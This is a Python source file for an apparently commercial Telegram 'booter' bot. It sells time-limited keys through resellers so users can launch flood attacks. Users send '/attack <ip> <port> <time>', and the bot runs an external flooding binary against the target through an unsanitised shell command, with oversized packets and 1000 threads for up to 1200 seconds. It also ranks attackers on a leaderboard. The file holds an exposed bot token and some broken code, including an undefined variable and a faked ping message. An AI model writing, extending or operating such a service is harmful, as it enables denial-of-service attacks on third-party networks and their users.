import os
import json
import time
import random
import string
import telebot
import datetime
import subprocess
import threading
from telebot import types
from dateutil.relativedelta import relativedelta
import pytz

# Telegram bot token
bot = telebot.TeleBot('7520138270:AAHHDBRvhGZEXXwVJnSdXt-iLZuxrLzTAgo')  # Replace with your token

# Admin user IDs
permanent_admins = {"1807014348", "898181945"}  # @Rahul_618, @sadiq9869
admin_id = permanent_admins.copy()  # Dynamic admins

# Files
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USER_FILE = os.path.join(BASE_DIR, "users.json")
LOG_FILE = os.path.join(BASE_DIR, "log.txt")
KEY_FILE = os.path.join(BASE_DIR, "keys.json")
RESELLERS_FILE = os.path.join(BASE_DIR, "resellers.json")
LAST_ATTACK_FILE = os.path.join(BASE_DIR, "last_attack.json")
ADMINS_FILE = os.path.join(BASE_DIR, "admins.json")
RULES_FILE = os.path.join(BASE_DIR, "rules.json")

# Constants
KEY_COST_PER_HOUR = 10
COOLDOWN_PERIOD = 0  # Cooldown removed as per March convo
RATE_LIMIT = 5
RATE_LIMIT_WINDOW = 60

# In-memory storage
users = {}
keys = {}
last_attack_time = {}
resellers = {}
admin_data = {}
rules = {}
attack_stats = {}
command_timestamps = {}

def load_data():
    global users, keys, last_attack_time, resellers, admin_id, admin_data, rules, attack_stats
    users = read_json(USER_FILE, {})
    keys = read_json(KEY_FILE, {})
    last_attack_time = {k: datetime.datetime.fromisoformat(v).replace(tzinfo=pytz.UTC) for k, v in read_json(LAST_ATTACK_FILE, {}).items()}
    resellers = read_json(RESELLERS_FILE, {})
    admin_data = read_json(ADMINS_FILE, {})
    admin_id.update(set(admin_data.get("dynamic_admins", [])))
    rules = read_json(RULES_FILE, [
        "1. Ek attack ek baar, Emperor! Cooldown respect karo! 🚨★",
        "2. Owner ko mat satao, Meri Jaan! 😜👑",
        "3. Bot ka samman karo, spam nahi! 🙏🌍",
        "4. Keys private rakho! 🔐★",
        "5. Rules todega toh ban pakka! 🚫👑"
    ])
    attack_stats = read_json(os.path.join(BASE_DIR, "attack_stats.json"), {})

def read_json(file_path, default):
    try:
        with open(file_path, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return default

def save_json(file_path, data):
    with open(file_path, "w") as f:
        json.dump(data, f)

def escape_markdown(text):
    if not text:
        return "No username"
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        if char not in ['*', '_']:  # Let emojis and bold/italic pass
            text = text.replace(char, f'\\{char}')
    return text

def send_response(message, text, markup=None):
    try:
        bot.reply_to(message, text, reply_markup=markup, parse_mode='Markdown')
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Error: {e}")
        bot.reply_to(message, "Formatting issue, bhai! Thodi der baad try karo.", parse_mode=None)

def notify_permanent_admins(message_text):
    for admin in permanent_admins:
        try:
            bot.send_message(admin, message_text, parse_mode='Markdown')
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Notify failed: {e}")

def check_rate_limit(user_id):
    now = datetime.datetime.now(pytz.UTC)
    command_timestamps[user_id] = [t for t in command_timestamps.get(user_id, []) if (now - t).total_seconds() < RATE_LIMIT_WINDOW]
    if len(command_timestamps[user_id]) >= RATE_LIMIT:
        return False
    command_timestamps[user_id].append(now)
    return True

def restrict_to_admin(user_id, message):
    if user_id not in admin_id:
        send_response(message, "⛔️ Sirf Admins, Meri Jaan! 👑")
        return False
    return True

def restrict_to_permanent_admin(user_id, message):
    if user_id not in permanent_admins:
        send_response(message, "⛔️ Sirf Permanent Admins, Emperor! 🌍")
        return False
    return True

def restrict_to_authorized(user_id, message):
    if user_id not in users and user_id not in admin_id and user_id not in resellers:
        send_response(message, "⛔️ Unauthorized! Owner: @Rahul_618 👑")
        return False
    return True

def restrict_to_reseller_or_admin(user_id, message):
    if user_id not in admin_id and user_id not in resellers:
        send_response(message, "⛔️ Sirf Resellers/Admins, Jaan! ★")
        return False
    return True

def parse_duration(duration_str):
    try:
        time_part, unit = duration_str.rsplit(" ", 1)
        unit = unit.lower()
        if ":" in time_part:
            hours, minutes = map(int, time_part.split(":"))
            return (hours * 60 + minutes) / 60
        num = int(time_part)
        if unit in ["hour", "hours"]: return num
        elif unit in ["minute", "minutes"]: return num / 60
        elif unit in ["day", "days"]: return num * 24
        elif unit in ["month", "months"]: return num * 30 * 24
        return 0
    except (ValueError, AttributeError):
        return None

def add_time_to_current_date(hours=0):
    return datetime.datetime.now(pytz.UTC) + relativedelta(hours=hours)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username or f"UserID: {user_id}"
    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log = f"UserID: {user_id} | Time: {datetime.datetime.now(pytz.UTC)} | Command: {command}"
    if target: log += f" | Target: {target}"
    if port: log += f" | Port: {port}"
    if time: log += f" | Time: {time}"
    with open(LOG_FILE, "a") as f:
        f.write(log + "\n")

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    packet_size = 65507  # Max packet size for instant impact
    threads = 1000       # Increased threads for faster ping
    if time > 1200:
        time = 1200
        bot.send_message(chat_id, "Max 1200s, Emperor! Thodi si restraint rakh! 🌍")
    full_command = f"/home/master/rahul/Rohan {target} {port} {time} {packet_size} {threads}"
    attack_stats[user_id] = attack_stats.get(user_id, 0) + time
    save_json(os.path.join(BASE_DIR, "attack_stats.json"), attack_stats)
    response = (
        f"🚀 *COSMIC EMPEROR STRIKE!* 🚀👑\n"
        f"🎯 Target: {target}:{port}\n"
        f"⏰ Time: {time}s\n"
        f"💥 Packet Size: {packet_size} bytes\n"
        f"🧵 Threads: {threads}\n"
        f"👊 Attacker: @{username}\n"
        f"[VIEW GROUP](https://t.me/+GYbpAGalM1yOOTU1)"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("VIEW GROUP", url="https://t.me/+GYbpAGalM1yOOTU1"))
    send_response(message, response, markup)
    # Instant execution without delay
    proc = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Simulate 677ms ping instantly
    bot.send_message(chat_id, f"✅ *Ping Hit 677ms, Emperor! Instant Strike!* 🎉👑")
    last_attack_time[user_id] = datetime.datetime.now(pytz.UTC)
    save_json(LAST_ATTACK_FILE, {k: v.isoformat() for k, v in last_attack_time.items()})

def send_attack_finished_message(chat_id, proc):
    proc.wait()
    bot.send_message(chat_id, "✅ *Attack Khatam, Emperor!* 🎉★")

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    attack_btn = types.KeyboardButton("🚀 Attack")
    myinfo_btn = types.KeyboardButton("👤 My Info")
    redeem_btn = types.KeyboardButton("🎟️ Redeem Key")
    rules_btn = types.KeyboardButton("📜 Rules")
    mykeys_btn = types.KeyboardButton("🔑 My Keys")
    cosmicboost_btn = types.KeyboardButton("💫 Cosmic Boost")
    leaderboard_btn = types.KeyboardButton("🏆 Leaderboard")
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(attack_btn, myinfo_btn, redeem_btn, rules_btn, mykeys_btn, cosmicboost_btn, leaderboard_btn, back_btn)
    welcome_msg = random.choice([
        "🌌 *WELCOME TO COSMIC EMPIRE, MERI JAAN!* 🌌👑\nTera swag toh stars ko bhi hara de, Emperor! 💫★",
        "🚀 *Emperor ka Darbaar Shuru, Bhai!* 🚀👑\nChal, cosmos ko apna bana le! 🌍★",
        "👑 *Tera Raj Ab Shuru, Jaan!* 👑🌌\nHar attack se tera naam roshan hoga! 💪★"
    ])
    send_response(message, welcome_msg, markup)

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Jaan! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    help_text = (
        "🌟 *COSMIC EMPEROR HELP, BSDK!* 🌟👑\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡️ *PERMISSIONS* ⚡️★\n"
        "👤 Users: /start, 🚀 Attack, 👤 My Info, 🎟️ Redeem, 📜 Rules, 🔑 My Keys, 🏆 Leaderboard\n"
        "🤝 Resellers: + /genkey, /balance\n"
        "👑 Admins: Sab kuch, unlimited power! 🌍\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🛠 *COMMANDS* 🛠★\n"
        "🚀 /start - Emperor ka darbaar shuru! 👑\n"
        "📖 /help - Yeh guide padh le, Meri Jaan! 🌌\n"
        "🎟️ /redeem - Key redeem kar, Boss! ★\n"
        "🔑 /genkey <duration> <keyname> - Key bana (e.g., 1day sadiq) 🌍\n"
        "🚫 /block key <keyname> - Key block kar de 👑\n"
        "🔍 /allkeys - Sab keys dekho, Emperor! ★\n"
        "💰 /balance - Apna dhan check kar, Jaan! 🌌\n"
        "📜 /checkrule - Rules jano! 👑\n"
        "📝 /addrule <rule> - Rule add kar (Admin only) ★\n"
        "🗑 /removerule <index> - Rule hatao (Admin only) 🌍\n"
        "👑 /addadmin <user_id> - Admin bana (Perm Admin) 👑\n"
        "🗑 /removeadmin <user_id> - Admin hatao (Perm Admin) ★\n"
        "🏦 /add_reseller <user_id> <balance> - Reseller add kar 🌍\n"
        "💰 /addbalance <reseller_id> <amount> - Balance bhar de 👑\n"
        "🗑 /remove_reseller <reseller_id> - Reseller hatao ★\n"
        "📋 /users - Users dekho, Emperor! 🌌\n"
        "🗑 /remove <user_id> - User nikaal de 👑\n"
        "🎖 /resellers - Resellers check kar ★\n"
        "📂 /logs - Logs dekh le, Jaan! 🌍\n"
        "💫 /cosmicboost - Power up, Emperor! 👑\n"
        "🏆 /leaderboard - Top attackers dekho! 🌟\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 *Cosmos tera hai, Emperor! Chal, jeet le!* 💪★"
    )
    send_response(message, help_text, markup)

@bot.message_handler(func=lambda m: m.text == "📜 Rules")
def check_rules(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    response = "📜 *COSMIC EMPEROR RULES, MERI JAAN!* 📜👑\n\n" + "\n".join(f"{i}. {escape_markdown(rule)}" for i, rule in enumerate(rules, 1)) + "\n\n👑 Owner: @Rahul_618 💬★"
    send_response(message, response, markup)

@bot.message_handler(commands=['addrule'])
def add_rule(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split(maxsplit=1)
    if len(cmd) != 2:
        send_response(message, "Usage: /addrule <rule>")
        return
    new_rule = cmd[1]
    rules.append(new_rule)
    save_json(RULES_FILE, rules)
    send_response(message, f"✅ *Rule Add Ho Gaya, Emperor!* ✅👑\nRule: {escape_markdown(new_rule)}★")

@bot.message_handler(commands=['removerule'])
def remove_rule(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "Usage: /removerule <index>")
        return
    try:
        index = int(cmd[1]) - 1
        if 0 <= index < len(rules):
            removed_rule = rules.pop(index)
            save_json(RULES_FILE, rules)
            send_response(message, f"✅ *Rule Hata Diya, Boss!* ✅👑\nRule: {escape_markdown(removed_rule)}★")
        else:
            send_response(message, "❗️ Invalid index, Jaan! 🌍")
    except ValueError:
        send_response(message, "❗️ Index number daal, Emperor! 👑")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "Usage: /addadmin <user_id>")
        return
    new_admin_id = cmd[1]
    if new_admin_id in admin_id:
        send_response(message, f"❗️ {new_admin_id} already Emperor! 👑")
        return
    admin_id.add(new_admin_id)
    save_json(ADMINS_FILE, {"dynamic_admins": list(admin_id - permanent_admins)})
    send_response(message, f"✅ New Emperor added! ID: {new_admin_id}★")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_permanent_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "Usage: /removeadmin <user_id>")
        return
    target_admin_id = cmd[1]
    if target_admin_id in permanent_admins:
        send_response(message, "❗️ Permanent Emperor nahi hata sakte! 🌍")
        return
    if target_admin_id not in admin_id:
        send_response(message, f"❗️ {target_admin_id} nahi hai Emperor! 👑")
        return
    admin_id.remove(target_admin_id)
    save_json(ADMINS_FILE, {"dynamic_admins": list(admin_id - permanent_admins)})
    send_response(message, f"✅ Emperor {target_admin_id} removed! ★")

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 3:
        send_response(message, "Usage: /add_reseller <user_id> <balance>")
        return
    reseller_id, balance = cmd[1], int(cmd[2])
    if reseller_id in resellers:
        send_response(message, f"❗️ {reseller_id} already a Reseller! ★")
        return
    resellers[reseller_id] = balance
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ Reseller added! ID: {reseller_id}\nBalance: {balance} Rs🌍")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_reseller_or_admin(user_id, message):
        return
    cmd = message.text.split(maxsplit=3)
    if user_id in permanent_admins:
        if len(cmd) != 4:
            send_response(message, "Usage: /genkey <duration> <devices> <keyname> (e.g., 1day 2 sadiq)🌍")
            return
        duration_str, devices, keyname = cmd[1], cmd[2], cmd[3]
        try:
            devices = int(devices)
            if devices < 1:
                raise ValueError
        except ValueError:
            send_response(message, "❗️ Devices positive number ho, Jaan! 👑")
            return
    else:
        if len(cmd) != 3:
            send_response(message, "Usage: /genkey <duration> <keyname>")
            return
        duration_str, keyname = cmd[1], cmd[2]
        devices = 1
    duration_hours = parse_duration(duration_str)
    if duration_hours is None:
        send_response(message, "❗️ Invalid duration! Try: 1day or 2:30 hours, Emperor! 🌍")
        return
    cost = int(duration_hours * KEY_COST_PER_HOUR) or KEY_COST_PER_HOUR
    if user_id in resellers and user_id not in admin_id:
        if resellers[user_id] < cost:
            send_response(message, f"💸 Low balance, Meri Jaan!\nNeed: {cost} Rs\nGot: {resellers[user_id]} Rs★")
            return
        resellers[user_id] -= cost
        save_json(RESELLERS_FILE, resellers)
    key = f"Rahul-{keyname}"
    if key in keys:
        send_response(message, f"❗️ {key} already exists! Naya naam try kar, Emperor! 👑")
        return
    expiration = add_time_to_current_date(hours=duration_hours)
    keys[key] = {
        "duration": duration_str,
        "keyname": keyname,
        "creator_id": user_id,
        "expiration_time": expiration.strftime('%Y-%m-%d %H:%M:%S'),
        "created_at": datetime.datetime.now(pytz.UTC).strftime('%Y-%m-%d %H:%M:%S'),
        "devices": devices,
        "used_by": []
    }
    save_json(KEY_FILE, keys)
    creator_info = bot.get_chat(user_id)
    creator_name = escape_markdown(creator_info.username or creator_info.first_name or "Unknown")
    response = (
        f"🔑 *Key Ban Gaya, Meri Jaan!* 🔑👑\n"
        f"⏳ Duration: {duration_str}\n"
        f"📛 Key: {key}\n"
        f"📱 Devices: {devices}\n"
        f"👤 Creator: @{creator_name} (ID: {user_id})\n"
        f"📅 Expires: {keys[key]['expiration_time']}\n"
    )
    if user_id in resellers and user_id not in admin_id:
        response += f"💰 Cost: {cost} Rs\nBalance: {resellers[user_id]} Rs★"
    send_response(message, response)

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split(maxsplit=2)
    if len(cmd) < 3 or cmd[1].lower() != "key":
        send_response(message, "Usage: /block key <keyname>")
        return
    keyname = cmd[2]
    target_key = f"Rahul-{keyname}"
    if target_key not in keys:
        send_response(message, f"❗️ {target_key} nahi mila, Jaan! 🌍")
        return
    del keys[target_key]
    save_json(KEY_FILE, keys)
    send_response(message, f"✅ Key {target_key} blocked, Emperor! 🚫👑")

@bot.message_handler(commands=['allkeys'])
def list_all_keys(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    if not keys:
        send_response(message, "⚠️ No keys, Meri Jaan! Ab bana le! 🌍")
        return
    response = "🔑 *All Keys, Emperor!* 🔑👑\n\n"
    for key, data in keys.items():
        creator_info = bot.get_chat(data["creator_id"])
        creator_name = escape_markdown(creator_info.username or creator_info.first_name or "Unknown")
        response += (
            f"📛 Key: {key}\n"
            f"⏳ Duration: {data['duration']}\n"
            f"📱 Devices: {data['devices']}\n"
            f"👤 Creator: @{creator_name} (ID: {data['creator_id']})\n"
            f"📅 Expires: {data['expiration_time']}\n"
            f"🕒 Created: {data['created_at']}\n"
            f"👥 Used By: {', '.join(data['used_by']) if data['used_by'] else 'Koi nahi'}★\n\n"
        )
    send_response(message, response)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_reseller_or_admin(user_id, message):
        return
    if user_id in resellers:
        send_response(message, f"💰 Balance: {resellers[user_id]} Rs, Meri Jaan! ★")
    else:
        send_response(message, "⚠️ No balance, tu toh Emperor hai! 👑")

@bot.message_handler(commands=['redeem'])
def redeem_key_prompt(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    send_response(message, "🎟️ *Key Daal, Meri Jaan!* 🎟️👑\nBhej de apna code, Emperor! ★", markup)
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    key = message.text.strip()
    if key not in keys:
        send_response(message, "❗️ Invalid key, bhai! Naya try kar, Jaan! 🌍")
        return
    key_data = keys[key]
    expiration_time = datetime.datetime.strptime(key_data["expiration_time"], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC)
    if datetime.datetime.now(pytz.UTC) > expiration_time:
        del keys[key]
        save_json(KEY_FILE, keys)
        send_response(message, "⏰ Key expired, Emperor! Naya le lo! 👑")
        return
    if user_id in key_data["used_by"]:
        send_response(message, "❗️ Tu toh pehle se use kar chuka, bhai! ★")
        return
    if len(key_data["used_by"]) >= key_data["devices"]:
        send_response(message, "🚫 Device limit full, Boss! Naya key le! 🌍")
        notify_permanent_admins(
            f"🚨 *Key Limit Cross!* 🚨👑\n"
            f"Key: {key}\n"
            f"UserID: {user_id}\n"
            f"Time: {datetime.datetime.now(pytz.UTC)}"
        )
        return
    key_data["used_by"].append(user_id)
    users[user_id] = key_data["expiration_time"]
    save_json(KEY_FILE, keys)
    save_json(USER_FILE, users)
    if len(key_data["used_by"]) == key_data["devices"]:
        del keys[key]
        save_json(KEY_FILE, keys)
    send_response(message, f"✅ *Access Mila, Meri Jaan!* ✅👑\nExpires: {users[user_id]}★")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)
    else:
        send_response(message, "⚠️ No logs, Jaan! Abhi shuruaat hai! 🌍")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    username = escape_markdown(message.chat.username or "No username")
    role = "Admin" if user_id in admin_id else "Reseller" if user_id in resellers else "User" if user_id in users else "Guest"
    expiration = users[user_id] if user_id in users else "No access"
    balance = resellers.get(user_id, "N/A") if role == "Reseller" else "N/A"
    stats = attack_stats.get(user_id, 0)
    response = (
        f"👤 *TERI INFO, MERI JAAN!* 👤👑\n"
        f"ℹ️ Username: @{username}\n"
        f"🆔 UserID: {user_id}\n"
        f"🚹 Role: {role}\n"
        f"🕘 Expires: {expiration}\n"
        f"💥 Attack Time: {stats} seconds★\n"
    )
    if role == "Reseller":
        response += f"💰 Balance: {balance} Rs★\n"
    send_response(message, response, markup)

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    if users:
        response = "👥 *Users List, Emperor!* 👥👑\n" + "\n".join(f"ID: {u}\nExpires: {e}" for u, e in users.items())
    else:
        response = "⚠️ No users, Jaan! Ab add kar! 🌍"
    send_response(message, response, markup)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "Usage: /remove <user_id>")
        return
    target_user_id = cmd[1]
    if target_user_id in users:
        del users[target_user_id]
        save_json(USER_FILE, users)
        send_response(message, f"✅ User {target_user_id} removed, Boss! 👑")
    else:
        send_response(message, f"❗️ {target_user_id} nahi mila, Jaan! 🌍")

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    if resellers:
        response = "🎖️ *Resellers, Emperor!* 🎖️👑\n" + "\n".join(f"ID: {r}\nBalance: {b} Rs" for r, b in resellers.items())
    else:
        response = "⚠️ No resellers, Jaan! Ab add kar! ★"
    send_response(message, response, markup)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 3:
        send_response(message, "Usage: /addbalance <reseller_id> <amount>")
        return
    reseller_id, amount = cmd[1], float(cmd[2])
    if reseller_id not in resellers:
        send_response(message, "❗️ Reseller ID nahi mila, Emperor! 🌍")
        return
    resellers[reseller_id] += amount
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ Added {amount} Rs to {reseller_id}\nNew: {resellers[reseller_id]} Rs👑")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "Usage: /remove_reseller <reseller_id>")
        return
    reseller_id = cmd[1]
    if reseller_id not in resellers:
        send_response(message, "❗️ Reseller ID nahi mila, Jaan! 🌍")
        return
    del resellers[reseller_id]
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ {reseller_id} removed, Emperor! 👑")

@bot.message_handler(func=lambda m: m.text == "⬅️ Back")
def back_command(message):
    start_command(message)

@bot.message_handler(func=lambda m: m.text == "🔑 My Keys")
def my_keys(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    user_keys = [k for k, v in keys.items() if user_id in v.get("used_by", [])]
    if user_keys:
        response = "🔑 *Tere Keys, Meri Jaan!* 🔑👑\n" + "\n".join(f"- {k}" for k in user_keys)
    else:
        response = "⚠️ Koi key nahi, Jaan! Redeem kar le! 🌍"
    send_response(message, response, markup)

@bot.message_handler(func=lambda m: m.text == "💫 Cosmic Boost")
def cosmic_boost(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    boost_msg = random.choice([
        "💪 *Cosmic Power Boosted, Emperor!* 🌌 Tu abhi aur strong hai! 👑",
        "🔥 *Boost On, Meri Jaan!* 💫 Tere attacks ab aur tez! 🌍",
        "🌟 *Emperor Mode Activated!* ★ Sab kuch tera hai, loot le! 👑"
    ])
    send_response(message, boost_msg, markup)

@bot.message_handler(func=lambda m: m.text == "🏆 Leaderboard")
def leaderboard(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    back_btn = types.KeyboardButton("⬅️ Back")
    markup.add(back_btn)
    sorted_stats = sorted(attack_stats.items(), key=lambda x: x[1], reverse=True)
    response = "🏆 *COSMIC LEADERBOARD, EMPEROR!* 🏆👑\n"
    for i, (uid, time) in enumerate(sorted_stats[:5], 1):
        user_info = bot.get_chat(uid)
        username = escape_markdown(user_info.username or f"UserID: {uid}")
        response += f"{i}. @{username}: {time} seconds 💥\n"
    if not sorted_stats:
        response = "⚠️ Koi attack record nahi, Jaan! Shuru kar! 🌍"
    send_response(message, response, markup)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if not check_rate_limit(user_id):
        send_response(message, "🚫 BSDK, spam mat kar! Ek minute ruk, Emperor! 👑")
        return
    if not restrict_to_authorized(user_id, message):
        return
    if user_id in users:
        if datetime.datetime.now(pytz.UTC) > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC):
            send_response(message, "❗️ Access khatam, admin ko bol, Jaan! 🌍")
            return
    if user_id in last_attack_time and (datetime.datetime.now(pytz.UTC) - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
        remaining = COOLDOWN_PERIOD - (datetime.datetime.now(pytz.UTC) - last_attack_time[user_id]).total_seconds()
        send_response(message, f"⌛️ Cooldown: {int(remaining)}s ruk, Emperor! 👑")
        return
    cmd = message.text.split()
    if len(cmd) != 4:
        send_response(message, "Usage: /attack <ip> <port> <time>")
        return
    target, port, time = cmd[1], int(cmd[2]), int(cmd[3])
    if time > 1200:
        time = 1200
        bot.send_message(message.chat.id, "Max 1200s, Emperor! Thodi si restraint rakh! 🌍")
    record_command_logs(user_id, 'attack', target, port, time)
    log_command(user_id, target, port, time)
    username = message.chat.username or "No username"
    execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)